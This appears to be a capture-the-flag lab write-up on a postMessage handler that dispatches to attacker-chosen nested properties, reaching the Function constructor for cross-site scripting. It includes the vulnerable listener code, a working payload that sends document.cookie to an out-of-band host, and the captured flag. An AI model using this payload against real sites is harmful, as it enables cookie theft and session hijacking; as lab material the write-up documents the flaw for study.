# Portway Pwnbox Lab - postMessage nested log constructor gadget

Date: 2026-07-10
Target type: CTF/lab
Bug class: postMessage trust failure, prototype-chain gadget, XSS, reviewer bot abuse

## Observation

Login app at `https://6ef16173de2a.pwnbox-lab.com/`.

Handoff widget at `GET /embed/handoff`:

```javascript
const log = {
    error: { general: (data) => () => console.log("... "+ data.pageName +"..."), connection: ... },
    success: { general: ..., close: ... }
};

window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'log') {
        log[event.data.cat][event.data.message_type](event.data)()
    }
    if (event.data && event.data.action === 'drawingSaved') {
        location.reload();
        log["success"]["close"]('')
    }
});
```

## Hypothesis

Attacker-controlled `cat` and `message_type` may reach dangerous properties on the `log` object through prototype-chain access, turning the nested call into a `Function` constructor gadget.

## Evidence

`log.constructor.constructor` resolves to `Function`.

Call chain:

```javascript
log['constructor']['constructor'](event.data)()
// Function(event.data)()
```

If `event.data` is an array that survives structured clone and stringifies to JavaScript code, the created function executes on invocation.

Working payload:

```javascript
const code = '(new Image).src="https://[oast]/?c="+encodeURIComponent(document.cookie)';
const p = [code];
p.action = 'log';
p.cat = 'constructor';
p.message_type = 'constructor';
popup.postMessage(p, '*');
```

Popup required for first-party cookie access by reviewer session.

## Test

Exploit hosted at `https://l30on.top/k/portway2`, reported via `POST /report`.

## Result

```text
GET /?c=flag%3Dpwnbox%7Baafd360284d489acb919b0ae7401324c%7D
```

## Conclusion

Confirmed client-side trust failure. The widget dispatched to attacker-selected nested log handlers without origin checks. Using `cat=constructor` and `message_type=constructor` reached `Function` and achieved XSS in the Portway origin.

## Flag

`pwnbox{aafd360284d489acb919b0ae7401324c}`
